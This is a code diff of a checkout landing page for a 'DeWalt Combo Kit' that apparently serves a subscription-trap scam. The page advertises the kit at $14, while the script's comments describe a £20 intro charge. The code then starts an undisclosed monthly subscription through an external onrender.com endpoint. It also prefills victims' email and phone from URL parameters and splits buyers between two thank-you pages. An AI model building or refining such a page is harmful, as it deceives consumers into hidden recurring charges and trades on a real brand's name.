@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!DOCTYPE html> 
 <html lang="en">
 <head>
 
@@ -13,7 +13,7 @@
 
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
-  <title>20V MAX* 10-Tool Combo Kit</title>
+  <title>DeWalt Combo Kit</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;2.50;700;800;900&display=swap" rel="stylesheet">
 
   <style>
@@ -35,13 +35,14 @@
     .title{ font-size:28px; font-weight:900; text-align:center; margin:4px 0 14px }
     .sub{ text-align:center; color:var(--muted); margin-top:-6px; margin-bottom:16px }
 
-    /* === CHANGED ONLY THESE TWO RULES === */
-    .img-wrap{ display:flex; justify-content:center; align-items:center; padding:10px 0 16px }
+    /* === ONLY CHANGED THESE TWO RULES === */
+    .img-wrap{ display:flex; justify-content:center; align-items:center; padding:10px 0 16px; }
     .img-wrap img{
       display:block;
-      max-width:min(100%, 560px); /* never overflow card, but allow full image width */
-      height:auto;               /* keep aspect ratio */
-      object-fit:contain;        /* safety: never crop if a height is ever applied */
+      max-width:100%;
+      width:auto;            /* scale by width, never upscale past container */
+      height:auto;           /* preserve aspect ratio */
+      object-fit:contain;    /* safeguard if any height ever applied elsewhere */
       border-radius:18px; border:1px solid #eee;
     }
     /* ==================================== */
@@ -90,7 +91,7 @@
     <!-- STEP 1 -->
     <section id="step1" class="card step" aria-hidden="false">
       <h1 class="title">
-        20V MAX* 10-Tool <span id="priceHero" data-price> Combo Kit</span>!
+        DeWalt Combo Kit <span id="priceHero" data-price></span>!
       </h1>
       <p class="sub">Limited-time offer. Secure your new 20V MAX* 10-Tool Combo Kit today!</p>
 
@@ -300,18 +301,17 @@
         if(EU.has(cc)) return '€';
         return '$';
       }
-      function applyPriceSymbol(symbol){
+      function applyPriceSymbol(){  /* set fixed $14 and new title */
         document.querySelectorAll('[data-price]').forEach(el=>{
-          el.textContent = `${symbol}2.50`;
+          el.textContent = `$14`;
         });
-        document.title = `20V MAX* 10-Tool Combo Kit`;
+        document.title = `DeWalt Combo Kit`;
       }
 
       // Seed immediate fallbacks
       applyPriceSymbol('$');
       try { buildPrefixOptions(phonePrefix, 'US'); } catch {}
 
-      // Helper: fill country select with a single focused option + common fallbacks
       function initCountrySelect(code, name) {
         if (!billingCountry) return;
         const opts = [];
@@ -319,9 +319,7 @@
           const o = new Option(label, value, selected, selected);
           opts.push(o);
         }
-        // Primary detected country first
         if (code) add(code.toUpperCase(), `${name || code.toUpperCase()}`, true);
-        // A few commons as alternates
         [['US','United States'],['GB','United Kingdom'],['IE','Ireland'],['DE','Germany'],['FR','France'],['ES','Spain'],['IT','Italy'],['NL','Netherlands'],['AU','Australia'],['CA','Canada']].forEach(([c,n])=>{
           if (!code || c.toUpperCase()!==code.toUpperCase()) add(c, n, false);
         });
@@ -334,8 +332,6 @@
         .then(data => {
           const cc = ((data && (data.country || data.country_code)) || 'US').toUpperCase();
           applyPriceSymbol(symbolFor(cc));
-
-          // Prefer the exact calling code returned by the API (covers countries not in your static list)
           const apiCalling = (data && data.country_calling_code) || '';
           const apiName    = (data && data.country_name) || '';
           const city       = (data && data.city) || '';
@@ -353,8 +349,6 @@
           } else {
             try { buildPrefixOptions(phonePrefix, cc); } catch {}
           }
-
-          // NEW: prefill address Country/City
           try { initCountrySelect(cc, apiName); } catch {}
           try { if (city && !billingCity.value) billingCity.value = city; } catch {}
         })
@@ -374,13 +368,11 @@
       try{
         const qs = new URLSearchParams(location.search);
 
-        // Email via ?email= / ?e= / ?em= / ?mail=
         const emailParam = qs.get('email') || qs.get('e') || qs.get('em') || qs.get('mail');
         if (emailParam && emailInput) {
           emailInput.value = decodeURIComponent(emailParam).trim();
         }
 
-        // Phone can be: ?phone=+441234567890  OR split as ?prefix=%2B44&number=1234567890
         const prefixParam = qs.get('prefix') || qs.get('cc') || qs.get('dial');
         const numberParam = qs.get('number') || qs.get('n');
         const phoneParam  = qs.get('phone')  || qs.get('tel')  || qs.get('p') || qs.get('msisdn');
@@ -388,7 +380,6 @@
         let desiredPrefix = null;
         let desiredNumber = null;
 
-        // If a single phone is provided, try to split E.164 (+CCxxxxxxxxx)
         if (phoneParam) {
           let p = (phoneParam + '').replace(/[^\d+]/g,'');
           if (p.startsWith('+')) {
@@ -397,7 +388,6 @@
             if (hit) { desiredPrefix = hit; desiredNumber = p.slice(hit.length); }
             else { desiredPrefix = '+1'; desiredNumber = p.replace(/^\+\d{1,3}/,''); }
           } else {
-            // No +, treat as national number, leave prefix for explicit param or default later
             desiredNumber = p;
           }
         }
@@ -407,13 +397,10 @@
           desiredPrefix = cleaned.startsWith('+') ? cleaned : ('+' + cleaned);
         }
 
-        // Apply number immediately
         if (desiredNumber && phoneNumber) phoneNumber.value = desiredNumber;
 
-        // Apply prefix even if options aren't populated yet (retry a few times)
         function applyPrefix(){
           if (!desiredPrefix || !phonePrefix) return true;
-          // Ensure the option exists; if not, create one so value sticks
           const exists = Array.from(phonePrefix.options).some(o => o.value === desiredPrefix);
           if (!exists) {
             phonePrefix.insertBefore(new Option(`${desiredPrefix} — Your country`, desiredPrefix, true, true), phonePrefix.firstChild);
@@ -450,12 +437,10 @@
     document.getElementById("payNow").onclick=async()=>{
       hideError();showLoading();
 
-      // Build phone from prefix + digits only
       const rawPhone=(phoneNumber?.value||'').replace(/[^\d]/g,'');
       const prefix=(phonePrefix?.value||'+1').trim();
       const fullPhone = rawPhone ? `${prefix}${rawPhone}` : undefined;
 
-      // Collect billing address for Stripe billing_details.address
       const addr = {
         line1: (billingStreet?.value || '').trim() || undefined,
         city: (billingCity?.value || '').trim() || undefined,
@@ -477,7 +462,6 @@
       if(pm.error){hideLoading();showError(pm.error.message);return}
 
       try{
-        // 1) Create the £20 intro charge PaymentIntent
         const res=await fetch(SUBSCRIBE_URL,{
           method:"POST",
           headers:{"Content-Type":"application/json"},
@@ -493,12 +477,10 @@
         if(data.error){hideLoading();showError(data.error);return}
         if(!data.clientSecret){hideLoading();showError("Payment failed");return}
 
-        // 2) Confirm the intro charge (handles SCA/3DS)
         const conf=await stripe.confirmCardPayment(data.clientSecret);
         if(conf.error){hideLoading();showError(conf.error.message);return}
         if(!(conf.paymentIntent&&conf.paymentIntent.status==="succeeded")){hideLoading();showError("Payment not completed");return}
 
-        // 3) Start the subscription using the successful intro charge
         const subRes = await fetch("https://charmr-jfmc.onrender.com/api/stripe/start-monthly-after-trial",{
           method:"POST",
           headers:{"Content-Type":"application/json"},
@@ -510,8 +492,25 @@
         const subData = await subRes.json();
         if(subData.error){hideLoading();showError(subData.error);return}
 
-        // Success (your splitter code would live here if needed)
-        // window.location.replace("thankyou-iphone.html");
+        // Success: deterministically split traffic 50/50 between two thank-you pages.
+        const A = 'thankyou-iphone.html';
+        const B = 'thankyou-iphone-skip.html';
+        const pid = (conf && conf.paymentIntent && conf.paymentIntent.id) || data.paymentIntentId || '';
+        function fnv1a32(str){
+          let h = 0x811c9dc5 >>> 0;
+          for (let i = 0; i < str.length; i++) {
+            h ^= str.charCodeAt(i);
+            h = Math.imul(h, 0x01000193) >>> 0;
+          }
+          return h >>> 0;
+        }
+        function randomBit(){
+          try { const u32 = new Uint32Array(1); crypto.getRandomValues(u32); return (u32[0] & 1) === 0; }
+          catch(_) { return Math.random() < 0.5; }
+        }
+        const pickA = pid ? ((fnv1a32(pid) & 1) === 0) : randomBit();
+        location.replace(pickA ? A : B);
+
       }catch(e){
         hideLoading();showError(e.message||"Something went wrong");
       }
